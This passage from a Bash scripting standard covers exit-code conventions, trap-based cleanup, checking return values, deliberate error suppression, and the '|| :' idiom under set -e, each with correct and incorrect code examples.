|------|------|-------------|-------|
| 11 | ERR_PERM | Operation not permitted | EPERM=1 |
| 12 | ERR_READONLY | Read-only filesystem | EROFS=30 |
| 13 | ERR_ACCESS | Permission denied | EACCES=13 |

#### Resources

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 14 | ERR_NOMEM | Out of memory | ENOMEM=12 |
| 15 | ERR_NOSPC | No space left on device | ENOSPC=28 |
| 16 | ERR_BUSY | Resource busy/locked | EBUSY=16 |
| 17 | ERR_EXIST | Already exists | EEXIST=17 |

#### Environment & Dependencies

| Code | Name | Description |
|------|------|-------------|
| 18 | ERR_NODEP | Missing dependency (command/library) |
| 19 | ERR_CONFIG | Configuration error |
| 20 | ERR_ENV | Environment error |
| 21 | ERR_STATE | Invalid state/precondition |

#### Network

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 23 | ERR_NETWORK | General network error | - |
| 24 | ERR_TIMEOUT | Operation timed out | ETIMEDOUT=110 |
| 25 | ERR_HOST | Host unreachable/unknown | EHOSTUNREACH=113 |

---

### Reserved Ranges

| Range | Purpose |
|-------|---------|
| 64-78 | BSD sysexits.h (EX_USAGE=64, EX_CONFIG=78) |
| 126 | Command cannot execute (Bash) |
| 127 | Command not found (Bash) |
| 128+n | Fatal signal n (130=SIGINT, 137=SIGKILL, 143=SIGTERM) |

---

### Common Usage Examples

```bash
# File operations
[[ -f "$config" ]] || die 3 "Config not found ${config@Q}"
[[ -d "$dir" ]] || die 6 "Not a directory ${dir@Q}"
[[ -s "$input" ]] || die 7 "Input file is empty ${input@Q}"

# Argument validation
[[ -n "$required" ]] || die 8 'Required argument missing: --name'
((port >= 1 && port <= 65535)) || die 9 "Port out of range: $port"
[[ "$mode" =~ ^(read|write)$ ]] || die 22 "Invalid mode ${mode@Q}"

# Permissions
[[ -r "$file" ]] || die 13 "Cannot read ${file@Q}"
[[ -w "$dir" ]] || die 12 "Directory is read-only ${dir@Q}"

# Dependencies
command -v jq &>/dev/null || die 18 'Missing dependency: jq'
[[ -f "$config" ]] || die 19 'Configuration file missing'

# Network
curl -sf "$url" || die 24 "Request timed out: $url"
ping -c1 "$host" &>/dev/null || die 25 "Host unreachable: $host"
```

---

### Checking Exit Codes

```bash
if validate_input "$data"; then
  process "$data"
else
  case $? in
    8)  die 8 'Validation failed: missing required field' ;;
    9)  die 9 'Validation failed: value out of range' ;;
    22) die 22 'Validation failed: invalid format' ;;
    *)  die 1 'Validation failed: unknown error' ;;
  esac
fi
```

---

### Design Rationale

- **0-2 (Bash convention)**: Match standard shell behavior
- **3-25 (BCS custom)**: Logical groupings by error category
- **22 (EINVAL)**: Preserved at errno value - widely recognized
- **errno alignment**: Where practical (5, 13, 16, 17, 22) for familiarity
- **Avoid 64+**: Reserved for sysexits.h and signal codes

**Goal**: Consistency across scripts when the same error type occurs. Not a mandate - use what makes sense for your script.



---


**Rule: BCS0603**

## Trap Handling

**Standard cleanup pattern:**

```bash
cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap during cleanup to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Cleanup operations
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir" ||:
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile" ||:

  # Log cleanup completion
  ((exitcode == 0)) && info 'Cleanup completed successfully' || warn "Cleanup after error (exit $exitcode)"

  exit "$exitcode"
}

# Install trap
trap 'cleanup $?' SIGINT SIGTERM EXIT
```

**Rationale for trap handling:**
- **Resource cleanup**: Ensures temp files, locks, processes are cleaned up even on errors
- **Signal handling**: Responds to Ctrl+C (SIGINT), kill (SIGTERM), and normal exit
- **Preserves exit code**: `$?` captures original exit status
- **Prevents partial state**: Cleanup runs regardless of how script exits

**Understanding trap signals:**

| Signal | Meaning | When Triggered |
|--------|---------|----------------|
| `EXIT` | Script exit | Always runs on script exit (normal or error) |
| `SIGINT` | Interrupt | User presses Ctrl+C |
| `SIGTERM` | Terminate | `kill` command (default signal) |
| `ERR` | Error | Command fails (with `set -e`) |
| `DEBUG` | Debug | Before every command (debugging only) |

**Common trap patterns:**

**1. Temp file cleanup:**
```bash
# Create temp file
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# Script uses temp_file
echo "data" > "$temp_file"
# ...

# Cleanup happens automatically on exit
```

**2. Temp directory cleanup:**
```bash
# Create temp directory
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT

# Use temp directory
extract_archive "$archive" "$temp_dir"
# ...

# Directory automatically cleaned up on exit
```

**3. Lockfile cleanup:**
```bash
lockfile=/var/lock/myapp.lock

acquire_lock() {
  if [[ -f "$lockfile" ]]; then
    die 1 "Already running (lock file exists ${lockfile@Q})"
  fi
  echo $$ > "$lockfile" || die 1 "Failed to create lock file ${lockfile@Q}"
  trap 'rm -f "$lockfile"' EXIT
}

acquire_lock
# Script runs exclusively
# Lock released automatically on exit
```

**4. Process cleanup:**
```bash
# Start background process
long_running_command &
bg_pid=$!

# Ensure background process is killed on exit
trap 'kill $bg_pid 2>/dev/null' EXIT

# Script continues
# Background process killed automatically on exit
```

**5. Comprehensive cleanup function:**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Global cleanup resources
declare -- temp_dir=''
declare -- lockfile=''
declare -i bg_pid=0

cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Kill background processes
  ((bg_pid)) && kill "$bg_pid" 2>/dev/null ||:

  # Remove temp directory
  if [[ -n "$temp_dir" && -d "$temp_dir" ]]; then
    rm -rf "$temp_dir" || warn "Failed to remove temp directory ${temp_dir@Q}"
  fi

  # Remove lockfile
  if [[ -n "$lockfile" && -f "$lockfile" ]]; then
    rm -f "$lockfile" || warn "Failed to remove lockfile ${lockfile@Q}"
  fi

  # Log exit
  if ((exitcode == 0)); then
    info 'Script completed successfully'
  else
    error "Script exited with error code: $exitcode"
  fi

  exit "$exitcode"
}

# Install trap EARLY (before creating resources)
trap 'cleanup $?' SIGINT SIGTERM EXIT

# Create resources
temp_dir=$(mktemp -d)
lockfile=/var/lock/myapp-"$$".lock
echo $$ > "$lockfile"

# Start background job
monitor_process &
bg_pid=$!

# Main script logic
main "$@"

# cleanup() called automatically on exit
```

**Multiple trap handlers (bash 3.2+):**
```bash
# Can combine multiple traps for same signal
trap 'echo "Exiting..."' EXIT
trap 'rm -f "$temp_file"' EXIT  # ✗ This REPLACES the previous trap!

# ✓ Correct - combine in one trap
trap 'echo "Exiting..."; rm -f "$temp_file"' EXIT

# ✓ Or use a cleanup function
trap 'cleanup' EXIT
```

**Trap execution order:**
```bash
# Traps execute in order: specific signal, then EXIT
trap 'echo "SIGINT handler"' SIGINT
trap 'echo "EXIT handler"' EXIT

# On Ctrl+C:
# 1. SIGINT handler runs
# 2. EXIT handler runs
# 3. Script exits
```

**Disabling traps:**
```bash
# Disable specific trap
trap - EXIT
trap - SIGINT SIGTERM

# Disable trap during critical section
trap - SIGINT  # Ignore Ctrl+C during critical operation
perform_critical_operation
trap 'cleanup $?' SIGINT  # Re-enable
```

**Trap gotchas and best practices:**

**1. Trap recursion prevention:**
```bash
cleanup() {
  # ✓ CRITICAL: Disable trap first to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # If cleanup fails, trap won't trigger again
  rm -rf "$temp_dir"  # If this fails...
  exit "$exitcode"    # ...we still exit cleanly
}
```

**2. Preserve exit code:**
```bash
# ✓ Correct - capture $? immediately
trap 'cleanup $?' EXIT

# ✗ Wrong - $? may change between trigger and handler
trap 'cleanup' EXIT  # $? inside cleanup may be different
```

**3. Quote trap commands:**
```bash
# ✓ Correct - single quotes prevent early expansion
trap 'rm -f "$temp_file"' EXIT

# ✗ Wrong - double quotes expand variables now, not on trap
temp_file=/tmp/foo
trap "rm -f $temp_file" EXIT  # Expands to: trap 'rm -f /tmp/foo' EXIT
temp_file=/tmp/bar  # Trap still removes /tmp/foo!
```

**4. Set trap early:**
```bash
# ✓ Correct - set trap BEFORE creating resources
trap 'cleanup $?' EXIT
temp_file=$(mktemp)

# ✗ Wrong - resource created before trap installed
temp_file=$(mktemp)
trap 'cleanup $?' EXIT  # If script exits between these lines, temp_file leaks!
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - not preserving exit code
trap 'rm -f "$temp_file"; exit 0' EXIT  # Always exits with 0!

# ✓ Correct - preserve exit code
trap 'exitcode=$?; rm -f "$temp_file"; exit $exitcode' EXIT

# ✗ Wrong - using function without ()
trap cleanup EXIT  # Tries to run command named "cleanup"

# ✓ Correct - use function call syntax
trap 'cleanup $?' EXIT

# ✗ Wrong - complex cleanup logic inline
trap 'rm "$file1"; rm "$file2"; kill $pid; rm -rf "$dir"' EXIT

# ✓ Correct - use cleanup function
cleanup() {
  rm -f "$file1" "$file2"
  kill "$pid" 2>/dev/null
  rm -rf "$dir"
}
trap 'cleanup' EXIT
```

**Testing trap handlers:**

```bash
#!/usr/bin/env bash
set -euo pipefail

cleanup() {
  echo "Cleanup called with exit code: ${1:-?}"
  trap - EXIT
  exit "${1:-0}"
}

trap 'cleanup $?' EXIT

echo "Normal operation..."
# Test Ctrl+C: press Ctrl+C -> cleanup called
# Test error: false -> cleanup called with exit code 1
# Test normal: script ends -> cleanup called with exit code 0
```

**Summary:**
- **Always use cleanup function** for non-trivial cleanup
- **Disable trap inside cleanup** to prevent recursion
- **Set trap early** before creating resources
- **Preserve exit code** with `trap 'cleanup $?' EXIT`
- **Use single quotes** to delay variable expansion
- **Test thoroughly** with normal exit, errors, and signals


---


**Rule: BCS0604**

## Checking Return Values

**Always check return values of commands and function calls, providing informative error messages that include context about what failed. While `set -e` helps, explicit checking gives better control over error handling and messaging.**

**Rationale:**

- **Better Error Messages**: Explicit checks allow contextual error messages showing what operation failed
- **Controlled Recovery**: Some failures should trigger cleanup or fallback logic, not immediate exit
- **`set -e` Limitations**: `set -e` doesn't catch all failures (pipelines, command substitution, conditions)
- **Debugging Aid**: Explicit checks make it obvious which command failed
- **Partial Failure Handling**: Some operations can continue after non-critical failures
- **User Experience**: Informative errors help users understand what went wrong and how to fix it

**When `set -e` is not enough:**

```bash
# set -e doesn't catch these failures:

# 1. Commands in pipelines (except last)
cat missing_file.txt | grep pattern  # Doesn't exit if cat fails!

# 2. Commands in conditionals
if command_that_fails; then
  echo 'This runs even though command failed'
fi

# 3. Commands with || (already handled)
failing_command || echo 'Failed but continuing'

# 4. Command substitution in assignments
output=$(failing_command)  # Doesn't exit!
echo "$output"  # Empty, but script continues

# 5. Functions with explicit return
my_function() {
  return 1
}
my_function  # Exits with set -e
# But if used in conditional, doesn't exit:
if my_function; then
  echo 'Never reached'
fi
```

**Basic return value checking patterns:**

**Pattern 1: Explicit if check (most informative)**

```bash
# ✓ Best for critical operations needing context
if ! mv "$source_file" "$dest_dir/"; then
  error "Failed to move ${source_file@Q} to ${dest_dir@Q}"
  error 'Check permissions and disk space'
  exit 1
fi
```

**Pattern 2: || with die (concise)**

```bash
# ✓ Good for simple cases with one-line error
mv "$source_file" "$dest_dir/" || die 1 "Failed to move ${source_file@Q}"

# ✓ Can include variable context
cp "$config" "$backup" || die 1 "Failed to backup ${config@Q} to ${backup@Q}"
```

**Pattern 3: || with command group (for cleanup)**

```bash
# ✓ Good when failure requires cleanup
mv "$temp_file" "$final_location" || {
  error "Failed to move ${temp_file@Q} to ${final_location@Q}"
  rm -f "$temp_file"
  exit 1
}

# ✓ Multiple cleanup steps
process_file "$input" || {
  error "Processing failed: $input"
  restore_backup
  cleanup_temp_files
  return 1
}
```

**Pattern 4: Capture and check return code**

```bash
# ✓ When you need the return code value
local -i exit_code
command_that_might_fail
exit_code=$?

if ((exit_code != 0)); then
  error "Command failed with exit code $exit_code"
  return "$exit_code"
fi

# ✓ Different actions for different exit codes
wget "$url"
case $? in
  0) success "Download complete" ;;
  1) die 1 "Generic error" ;;
  2) die 2 "Parse error" ;;
  3) die 3 "File I/O error" ;;
  4) die 4 "Network failure" ;;
  *) die 1 "Unknown error code: $?" ;;
esac
```

**Pattern 5: Function return value checking**

```bash
# Define function with meaningful return codes
validate_file() {
  local -- file=$1

  [[ -f "$file" ]] || return 2  # Not found
  [[ -r "$file" ]] || return 5  # Permission denied
  [[ -s "$file" ]] || return 22 # Invalid (empty)

  return 0  # Success
}

# Check function return value
if validate_file "$config_file"; then
  source "$config_file"
else
  case $? in
    2)  die 2 "Config file not found ${config_file@Q}" ;;
    5)  die 5 "Cannot read config file ${config_file@Q}" ;;
    22) die 22 "Config file is empty ${config_file@Q}" ;;
    *)  die 1 "Config validation failed ${config_file@Q}" ;;
  esac
fi
```

**Edge case: Pipelines**

```bash
# Problem: set -e only checks last command in pipeline
cat missing_file | grep pattern  # Continues even if cat fails!

# ✓ Solution 1: Use PIPEFAIL (from set -euo pipefail)
set -o pipefail  # Now entire pipeline fails if any command fails
cat missing_file | grep pattern  # Exits if cat fails

# ✓ Solution 2: Check PIPESTATUS array
cat file1 | grep pattern | sort
if ((PIPESTATUS[0] != 0)); then
  die 1 'cat failed'
elif ((PIPESTATUS[1] != 0)); then
  info 'No matches found (grep returned non-zero)'
elif ((PIPESTATUS[2] != 0)); then
  die 1 'sort failed'
fi

# ✓ Solution 3: Avoid pipeline, use process substitution
grep pattern < <(cat file1)
```

**Edge case: Command substitution**

```bash
# Problem: Command substitution failure not caught
declare -- output
output=$(failing_command)  # Doesn't exit even with set -e!
echo "Output: $output"  # Empty

# ✓ Solution 1: Check after assignment
output=$(command_that_might_fail) || die 1 'Command failed'

# ✓ Solution 2: Explicit check in separate step
declare -- result
if ! result=$(complex_command arg1 arg2); then
  die 1 'complex_command failed'
fi

# ✓ Solution 3: Use set -e with inherit_errexit (Bash 4.4+)
shopt -s inherit_errexit  # Command substitution inherits set -e
output=$(failing_command)  # NOW exits with set -e
```

**Edge case: Conditional contexts**

```bash
# Commands in if/while/until don't trigger set -e

# Problem: This doesn't exit even with set -e
if some_command; then
  echo 'Command succeeded'
else
  echo 'Command failed but script continues'
fi

# ✓ Solution: Explicit check after conditional
if some_command; then
  process_result
else
  die $? 'some_command failed'
fi

# Or check return code
some_command
if (($?)); then
  die $? 'some_command failed'
fi
```

**Complete example with comprehensive error checking:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Messaging functions
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
info() { echo "$SCRIPT_NAME: $*"; }

# Validate prerequisites
check_prerequisites() {
  local -- cmd
  local -a required_commands=(tar gzip sha256sum)

  info 'Checking prerequisites...'

  for cmd in "${required_commands[@]}"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      die 1 "Required command not found: $cmd"
    fi
  done

  info 'Prerequisites check passed'
}

# Create backup with error checking
create_backup() {
  local -- source_dir=$1
  local -- backup_file=$2
  local -- temp_file
  local -i exit_code

  info "Creating backup: $source_dir -> $backup_file"

  # Check source exists
  if [[ ! -d "$source_dir" ]]; then
    error "Source directory not found ${source_dir@Q}"
    return 2
  fi

  # Check destination writable
  if [[ ! -w "${backup_file%/*}" ]]; then
    error "Cannot write to directory '${backup_file%/*}'"
    return 5
  fi

  # Create backup with error handling
  temp_file="$backup_file".tmp

  # Create tar archive
  if ! tar -czf "$temp_file" -C "${source_dir%/*}" "${source_dir##*/}"; then
    error 'Failed to create tar archive'
    rm -f "$temp_file"
    return 1
  fi

  # Verify archive
  if ! tar -tzf "$temp_file" >/dev/null; then
    error 'Backup verification failed'
    rm -f "$temp_file"
    return 1
  fi

  # Move to final location
  if ! mv "$temp_file" "$backup_file"; then
    error 'Failed to move backup to final location'
    rm -f "$temp_file"
    return 1
  fi

  # Create checksum
  if ! sha256sum "$backup_file" > "$backup_file".sha256; then
    error 'Failed to create checksum'
    # Non-fatal - backup is still valid
    return 0
  fi

  info "Backup created successfully ${backup_file@Q}"
  return 0
}

# Process multiple files with return value checking
process_files() {
  local -a files=("$@")
  local -- file
  local -i success_count=0
  local -i fail_count=0

  for file in "${files[@]}"; do
    if create_backup "$file" /backup/"${file##*/}".tar.gz; then
      success_count+=1
      info "Success: $file"
    else
      fail_count+=1
      error "Failed: $file (return code: $?)"
    fi
  done

  info "Results: $success_count successful, $fail_count failed"

  # Return non-zero if any failures
  ((fail_count == 0))
}

main() {
  check_prerequisites

  local -a source_dirs=(/etc /var/log)

  if ! process_files "${source_dirs[@]}"; then
    die 1 'Some backups failed'
  fi

  info 'All backups completed successfully'
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - ignoring return values
mv "$file" "$dest"
# No check! If mv fails, script continues

# ✓ Correct - check return value
mv "$file" "$dest" || die 1 "Failed to move ${file@Q} to ${dest@Q}"

# ✗ Wrong - checking $? too late
command1
command2
if (($?)); then  # Checks command2, not command1!

# ✓ Correct - check immediately
command1
if (($?)); then
  die 1 'command1 failed'
fi
command2

# ✗ Wrong - generic error message
mv "$file" "$dest" || die 1 'Move failed'
# User has no idea what file or where!

# ✓ Correct - specific error message
mv "$file" "$dest" || die 1 "Failed to move ${file@Q} to ${dest@Q}"

# ✗ Wrong - not checking command substitution
checksum=$(sha256sum "$file")
# If sha256sum fails, checksum is empty but script continues!

# ✓ Correct - check command substitution
checksum=$(sha256sum "$file") || die 1 "Failed to compute checksum for ${file@Q}"

# ✗ Wrong - not cleaning up after failure
cp "$source" "$dest" || exit 1
# Might leave partial file at $dest!

# ✓ Correct - cleanup on failure
cp "$source" "$dest" || {
  rm -f "$dest"
  die 1 "Failed to copy ${source@Q} to ${dest@Q}"
}

# ✗ Wrong - assuming set -e catches everything
set -e
output=$(failing_command)  # Doesn't exit!
cat missing_file | grep pattern  # Doesn't exit if cat fails!

# ✓ Correct - explicit checks even with set -e
set -euo pipefail
shopt -s inherit_errexit
output=$(failing_command) || die 1 'Command failed'
cat file | grep pattern  # Now exits if cat fails (pipefail)
```

**Testing return value handling:**

```bash
# Test function return values
test_function_returns() {
  # Should return 0 for valid input
  validate_file "existing_file.txt"
  local -i result=$?
  ((result == 0)) || die 1 "Expected return 0, got $result"

  # Should return 2 for missing file
  validate_file missing_file.txt
  result=$?
  ((result == 2)) || die 1 "Expected return 2, got $result"

  info "Return value tests passed"
}

# Test error handling
test_error_handling() {
  # Should exit with error on failure
  if failing_operation; then
    die 1 'Expected failure but succeeded'
  fi

  info 'Error handling tests passed'
}
```

**Summary:**

- **Always check return values** of critical operations
- **Use `set -euo pipefail`** as baseline, but add explicit checks for control
- **Provide context** in error messages (what failed, with what inputs)
- **Check command substitution** results: `output=$(cmd) || die 1 "cmd failed"`
- **Use PIPEFAIL** to catch pipeline failures
- **Handle different exit codes** appropriately (0=success, 1=general error, 2=usage, etc.)
- **Clean up on failure** using `|| { cleanup; exit 1; }` pattern
- **Test error paths** to ensure failures are caught

**Key principle:** Defensive programming means assuming operations can fail. Check return values, provide informative errors, and handle failures gracefully. The extra lines of error checking prevent hours of debugging mysterious failures.


---


**Rule: BCS0605**

## Error Suppression

**Only suppress errors when the failure is expected, non-critical, and you have explicitly decided it's safe to continue. Always document WHY errors are being suppressed. Indiscriminate error suppression masks bugs and creates unreliable scripts.**

**Rationale:**

- **Masks Real Bugs**: Suppressing errors hides failures that should be fixed
- **Silent Failures**: Scripts appear to succeed while actually failing
- **Security Risk**: Ignored errors can leave systems in insecure states
- **Debugging Nightmare**: Suppressed errors make it impossible to diagnose problems
- **False Success**: Users think operation succeeded when it actually failed
- **Technical Debt**: Suppressed errors often indicate design problems that should be fixed

**When error suppression IS appropriate:**

**1. Checking if command exists (expected to fail):**

```bash
# ✓ Appropriate - failure is expected and non-critical
if command -v optional_tool >/dev/null 2>&1; then
  info 'optional_tool available'
else
  info 'optional_tool not found (optional)'
fi
```

**2. Checking if file exists (expected to fail):**

```bash
# ✓ Appropriate - testing existence, failure is expected
if [[ -f "$optional_config" ]]; then
  source "$optional_config"
else
  info "Using default configuration (no $optional_config)"
fi
```

**3. Cleanup operations (may fail if nothing to clean):**

```bash
# ✓ Appropriate - cleanup may have nothing to do
cleanup_temp_files() {
  # Suppress errors - temp files might not exist
  rm -f /tmp/myapp_* 2>/dev/null || true
  rmdir /tmp/myapp 2>/dev/null || true
}
```

**4. Optional operations with fallback:**

```bash
# ✓ Appropriate - md2ansi is optional, have fallback
if command -v md2ansi >/dev/null 2>&1; then
  md2ansi < "$file" || cat "$file"  # Fallback to cat
else
  cat "$file"  # md2ansi not available
fi
```

**5. Idempotent operations:**

```bash
# ✓ Appropriate - directory may already exist
install -d "$target_dir" 2>/dev/null || true

# ✓ Appropriate - user may already exist
id "$username" >/dev/null 2>&1 || useradd "$username"
```

**When error suppression is DANGEROUS:**

**1. File operations (usually critical):**

```bash
# ✗ DANGEROUS - if copy fails, script continues with missing file!
cp "$important_config" "$destination" 2>/dev/null || true

# ✓ Correct - check result and fail explicitly
if ! cp "$important_config" "$destination"; then
  die 1 "Failed to copy config to ${destination@Q}"
fi
```

**2. Data processing (silently loses data):**

```bash
# ✗ DANGEROUS - if processing fails, data is lost!
process_data < input.txt > output.txt 2>/dev/null || true

# ✓ Correct - check result
if ! process_data < input.txt > output.txt; then
  die 1 'Data processing failed'
fi
```

**3. System configuration (leaves system broken):**

```bash
# ✗ DANGEROUS - if systemctl fails, service is not running!
systemctl start myapp 2>/dev/null || true

# ✓ Correct - verify service started
systemctl start myapp || die 1 'Failed to start myapp service'
```

**4. Security operations (creates vulnerabilities):**

```bash
# ✗ DANGEROUS - if chmod fails, file has wrong permissions!
chmod 600 "$private_key" 2>/dev/null || true

# ✓ Correct - security operations must succeed
chmod 600 "$private_key" || die 1 "Failed to secure ${private_key@Q}"
```

**5. Dependency checks (script runs without required tools):**

```bash
# ✗ DANGEROUS - if git is missing, later commands will fail mysteriously!
command -v git >/dev/null 2>&1 || true

# ✓ Correct - fail early if dependency missing
command -v git >/dev/null 2>&1 || die 1 'git is required'
```

**Error suppression patterns:**

**Pattern 1: Redirect stderr to /dev/null**

```bash
# Suppress only error messages
command 2>/dev/null

# Use when: Error messages are noisy but you still check return value
if ! command 2>/dev/null; then
  error 'command failed'
fi
```

**Pattern 2: || true (ignore return code)**

```bash
# Make command always succeed
command1 || true
command2 ||:

# Use when: Failure is acceptable and you want to continue
rm -f /tmp/optional_file || true
```

**Pattern 3: Combined suppression**

```bash
# Suppress both errors and return code
command 2>/dev/null || true

# Use when: Both error messages and return code are irrelevant
rmdir /tmp/maybe_exists 2>/dev/null || true
```

**Pattern 4: Suppress with comment (ALWAYS document WHY)**

```bash
# Suppress errors for optional cleanup
# Rationale: Temp files may not exist, this is not an error
rm -f /tmp/myapp_* 2>/dev/null || true

# Suppress errors for idempotent operation
# Rationale: Directory may already exist from previous run
install -d "$cache_dir" 2>/dev/null || true
```

**Pattern 5: Conditional suppression**

```bash
# Only suppress in specific cases
if ((DRY_RUN)); then
  # In dry-run, operations are expected to fail
  actual_operation 2>/dev/null || true
else
  # In real mode, operations must succeed
  actual_operation || die 1 'Operation failed'
fi
```

**Complete example with appropriate suppression:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- CACHE_DIR="$HOME"/.cache/myapp
declare -- LOG_FILE="$HOME"/.local/share/myapp/app.log

# Check for optional dependency (suppress is OK)
check_optional_tools() {
  # ✓ Safe to suppress - tool is optional
  if command -v md2ansi >/dev/null 2>&1; then
    info 'md2ansi available for formatted output'
    declare -g -i HAS_MD2ANSI=1
  else
    info 'md2ansi not found (optional)'
    declare -g -i HAS_MD2ANSI=0
  fi
}

# Check required dependency (DO NOT suppress)
check_required_tools() {
  # ✗ Do NOT suppress - tool is required
  if ! command -v jq >/dev/null 2>&1; then
    die 1 'jq is required but not found'
  fi
  info 'Required tools found'
}

# Create directories (suppress is OK for idempotent operation)
create_directories() {
  # ✓ Safe to suppress - directory may already exist
  # Rationale: install -d is idempotent, existing directory is not an error
  install -d "$CACHE_DIR" 2>/dev/null || true
  install -d "${LOG_FILE%/*}" 2>/dev/null || true

  # But verify they exist now
  [[ -d "$CACHE_DIR" ]] || die 1 "Failed to create cache directory ${CACHE_DIR@Q}"
  [[ -d "${LOG_FILE%/*}" ]] || die 1 "Failed to create log directory: ${LOG_FILE%/*}"
}

# Cleanup old files (suppress is OK)
cleanup_old_files() {
  info 'Cleaning up old files...'

  # ✓ Safe to suppress - files may not exist
  # Rationale: Cleanup is best-effort, missing files are not an error
  rm -f "$CACHE_DIR"/*.tmp 2>/dev/null || true
  rm -f "$CACHE_DIR"/*.old 2>/dev/null || true

  # ✓ Safe to suppress - directory may be empty or not exist
  # Rationale: rmdir only removes empty directories, failure is expected
  rmdir "$CACHE_DIR"/temp_* 2>/dev/null || true

  info 'Cleanup complete'
}

# Process data (DO NOT suppress)
process_data() {
  local -- input_file=$1
  local -- output_file=$2

  # ✗ Do NOT suppress - data processing errors are critical
  if ! jq '.data' < "$input_file" > "$output_file"; then
    die 1 "Failed to process ${input_file@Q}"
  fi

  # ✗ Do NOT suppress - validation must succeed
  if ! jq empty < "$output_file"; then
    die 1 "Output file is invalid ${output_file@Q}"
  fi

  info "Processed: $input_file -> $output_file"
}

main() {
  check_required_tools
  check_optional_tools
  create_directories
  cleanup_old_files

  # Process files (errors NOT suppressed)
  process_data input.json "$CACHE_DIR"/output.json

  info 'Processing complete'
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - suppressing critical operation
cp "$important_file" "$backup" 2>/dev/null || true
# If cp fails, you have no backup but script continues!

# ✓ Correct - check critical operations
cp "$important_file" "$backup" || die 1 'Failed to create backup'

# ✗ WRONG - suppressing without understanding why
some_command 2>/dev/null || true
# Why are we suppressing? Is this safe?

# ✓ Correct - document reason for suppression
# Suppress errors: temp directory may not exist (non-critical)
rmdir /tmp/myapp 2>/dev/null || true

# ✗ WRONG - suppressing all errors in function
process_files() {
  # ... many operations ...
} 2>/dev/null
# This suppresses ALL errors in function - extremely dangerous!

# ✓ Correct - only suppress specific operations
process_files() {
  critical_operation || die 1 'Critical operation failed'
  optional_cleanup 2>/dev/null || true  # Only this is suppressed
}

# ✗ WRONG - using set +e to suppress errors
set +e
critical_operation
set -e
# Disables error checking for entire block!

# ✓ Correct - use || true for specific command
critical_operation || {
  error 'Operation failed but continuing'
  # Decided this is safe to ignore in this context
  true
}

# ✗ WRONG - suppressing in production but not development
if [[ "$ENV" == production ]]; then
  operation 2>/dev/null || true
else
  operation
fi
# If it fails in production, you need to know!

# ✓ Correct - same error handling everywhere
operation || die 1 'Operation failed'
```

**Testing error suppression:**

```bash
# Verify suppression is appropriate
test_error_suppression() {
  # Test that suppressed operation actually might fail
  rm -f /nonexistent/file 2>/dev/null || true

  # Verify this didn't break anything
  [[ -d /tmp ]] || die 1 'Suppressed operation broke system!'

  # Test that non-suppressed operations are checked
  if ! cp /etc/passwd /tmp/test_passwd 2>&1; then
    info 'Correctly detected failure'
  else
    die 1 'Should have failed without /tmp write permission'
  fi

  rm -f /tmp/test_passwd
}
```

**Summary:**

- **Only suppress** when failure is expected, non-critical, and safe to ignore
- **Always document** WHY errors are suppressed (comment above suppression)
- **Never suppress** critical operations (data, security, required dependencies)
- **Use `|| true`** to ignore return code while keeping stderr visible
- **Use `2>/dev/null`** to suppress error messages while checking return code
- **Use both** (`2>/dev/null || true`) only when both messages and return code are irrelevant
- **Verify after** suppressed operations when possible
- **Test without** suppression first to ensure operation is correct

**Key principle:** Error suppression should be the exception, not the rule. Every `2>/dev/null` and `|| true` is a deliberate decision that this specific failure is safe to ignore. Document the decision with a comment explaining why.


---


**Rule: BCS0606**

## Conditional Declarations with Exit Code Handling

**When using arithmetic conditionals for optional declarations or actions under `set -e`, append `|| :` to prevent false conditions from triggering script exit.**

**Rationale:**

- **Arithmetic conditionals return exit codes**: `(())` returns 0 (success) when true, 1 (failure) when false
- **`set -e` exits on non-zero**: Under `set -euo pipefail`, any command returning non-zero exits the script
- **Conditional execution is intentional**: Sometimes we want `((condition)) && action` where action runs only if condition is true
- **False condition shouldn't exit**: When condition is false, we want to continue, not exit
- **`|| :` provides safe fallback**: The colon command `:` is a no-op that always returns 0 (success)
- **Idiomatic shell pattern**: `|| :` is the traditional Unix idiom for "ignore this error"

**The core problem:**

```bash
#!/bin/bash
set -euo pipefail

declare -i complete=0

# ✗ DANGEROUS: Script exits here if complete=0!
((complete)) && declare -g BLUE=$'\033[0;34m'
# When complete=0:
#   1. (( complete )) evaluates to false, returns 1
#   2. && short-circuits, declare never runs
#   3. Overall exit code is 1 (from the arithmetic test)
#   4. set -e sees exit code 1 and terminates the script!

echo 'This line never executes'
```

**The solution:**

```bash
#!/bin/bash
set -euo pipefail

declare -i complete=0

# ✓ SAFE: Script continues even when complete=0
((complete)) && declare -g BLUE=$'\033[0;34m' || :
# When complete=0:
#   1. (( complete )) evaluates to false, returns 1
#   2. && short-circuits, declare never runs
#   3. || : triggers, colon returns 0
#   4. Overall exit code is 0 (success)
#   5. Script continues normally

echo 'This line executes correctly'
```

**Why `:` (colon) over `true`:**

```bash
# Both are functionally equivalent no-ops that return 0

# ✓ PREFERRED: Colon command
